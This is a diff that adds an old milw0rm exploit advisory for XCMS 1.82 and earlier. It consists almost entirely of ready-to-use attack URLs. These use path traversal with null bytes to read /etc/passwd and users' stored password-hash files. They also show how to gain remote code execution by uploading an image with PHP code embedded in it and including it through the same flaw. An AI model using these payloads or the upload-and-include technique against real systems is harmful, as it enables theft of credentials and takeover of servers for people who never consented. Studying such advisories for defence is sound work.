@@ -1,0 +1,20 @@
+#  _ __   _____  _____ _ __
+# | '_ \ / _ \ \/ / _ \ '_ \
+# | | | |  __/>  <  __/ | | |
+# |_| |_|\___/_/\_\___|_| |_|
+# XCMS <= 1.82 LFI & RCE Xpl
+# Nexen rocked this one ;)
+# LFIs
+http://127.0.0.1/xcms/index.php?pg=admin&s=../../../../../etc/passwd\0
+http://127.0.0.1/xcms/index.php?mod=[existing module]&pg=../../../../../etc/passwd\0
+
+# Hash disclosure
+http://127.0.0.1/xcms/index.php?mod=[existing module]&pg=../../dati/membri/[username].dtb\0
+
+# RCE:
+Doing RCE is more difficult, you must have an image with a php code binded (you can use edjpgcom to do that)
+now upload that image on your panel, and exploit rce trough lfi:
+
+http://127.0.0.1/xcms/index.php?mod=[existing module]&pg=../../uploads/avatar/[your_username].jpg\0
+
+# milw0rm.com [2007-12-28]
